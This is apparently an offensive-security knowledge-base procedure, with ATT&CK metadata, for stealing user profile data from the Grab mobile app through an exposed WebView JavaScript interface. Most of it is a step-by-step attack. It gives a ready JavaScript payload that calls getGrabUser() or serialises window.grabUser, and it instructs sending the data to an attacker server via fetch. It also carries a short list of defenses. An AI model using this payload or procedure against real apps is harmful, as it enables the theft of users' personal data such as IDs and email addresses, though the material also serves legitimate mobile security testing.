---
id: proc-grab-execute-js-steal
tags:
  - xss
  - javascript
  - data-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Android
  - iOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:25:22.870Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-JavaScript-to-Steal-User-Data

## Summary

This procedure uses JavaScript on the loaded WebView page to invoke the exposed interface and retrieve serialized sensitive user data from the Grab app.

## Description

The malicious page runs JS to check for window.Android (Android) or window.grabUser (iOS), calling getGrabUser() which returns Gson-serialized profile data like user ID, email, and details. The data is then displayed or exfiltrated, enabling privacy breaches via unauthenticated links.

## Requirements

1. Malicious page loaded in WebView
2. JavaScript execution enabled in WebView
3. No CSP or origin restrictions

## Defense

Defensive measures and detection strategies:

- Remove or secure JavaScriptInterfaces with origin checks
- Avoid global objects like window.grabUser on iOS
- Implement data sanitization before serialization

## Objectives

1. Access user profile object
2. Serialize and extract sensitive info
3. Demonstrate disclosure impact

## Instructions

### Step 1: Inject Payload JS

**Context**: Embed script in hosted page2.html.

Add to page2.html:

```javascript
if(window.Android){ data = window.Android.getGrabUser(); } else if(window.grabUser){ data = JSON.stringify(window.grabUser); } document.write("Stolen data: "+ data);
```

> Loads on WebView open. Expected output: Page writes user data string.

### Step 2: Observe Exfiltration

**Context**: Verify data retrieval.

View output in WebView; for real exfil, send to attacker server via fetch.

**Expected Output**: JSON-like string with profile fields (e.g., {"userId":123,"email":"user@grab.com"}).

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- javascript
- theft
